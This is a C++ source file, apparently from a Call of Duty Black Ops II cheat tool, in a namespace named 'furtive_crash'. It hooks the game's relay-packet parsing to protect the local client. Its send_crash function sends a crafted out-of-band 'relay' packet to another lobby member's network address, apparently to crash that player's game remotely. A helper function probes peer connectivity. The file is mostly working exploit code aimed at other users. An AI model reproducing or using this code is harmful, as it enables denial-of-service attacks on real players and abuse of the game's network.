//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

namespace furtive_crash
{
	FurtiveHook fhAtoiCall{ x86Instruction::CALL, ProtoGenesys::bIsSteamVersion ? (LPVOID)0x7EB870 : (LPVOID)0x7EC480, &atoi_CL_HandleRelayPacket };

	int atoi_CL_HandleRelayPacket(const char* str)
	{
		return min(std::stoul(str), 17ul);
	}
	/*
	//=====================================================================================
	*/
	void init()
	{
		fhAtoiCall.SetHook();
	}
	/*
	//=====================================================================================
	*/
	void free()
	{
		fhAtoiCall.UnHook();
	}
	/*
	//=====================================================================================
	*/
    void send_crash(std::size_t client_num)
	{
		Sleep(500);

		char buf[1260];
		msg_t msg;
		t6::MSG_Init(&msg, buf, sizeof buf);
		t6::MSG_WriteString(&msg, "relay 1234567890");
		t6::NET_OutOfBandData(netsrc_t::NS_CLIENT1, (t6::g_partyData->in_party() ? t6::g_partyData : t6::g_lobbyData)->get_party_member(client_num)->platformAddr.netAddr, msg.data, msg.cursize);
	}
	/*
	//=====================================================================================
	*/
	bool send_connectivity_test(std::size_t client_num)
	{
		PartyData_s* party = (t6::g_partyData->in_party() ? t6::g_partyData : t6::g_lobbyData);

		if (const auto our_client_num = t6::Party_FindMemberByXUID(party, t6::Live_GetXuid(ControllerIndex_t::CONTROLLER_INDEX_0)); our_client_num >= 0)
		{
			char buf[1260];
			msg_t msg;

			t6::MSG_Init(&msg, buf, sizeof buf);
			t6::MSG_WriteString(&msg, "vt");
			t6::MSG_WriteByte(&msg, our_client_num);
			t6::CL_SendPeerData(party->session, 0, netsrc_t::NS_CLIENT1, client_num, &msg, 1);

			return t6::CL_CanWeConnectToClient(party->session, our_client_num, client_num);
		}

		return false;
	}
}

//=====================================================================================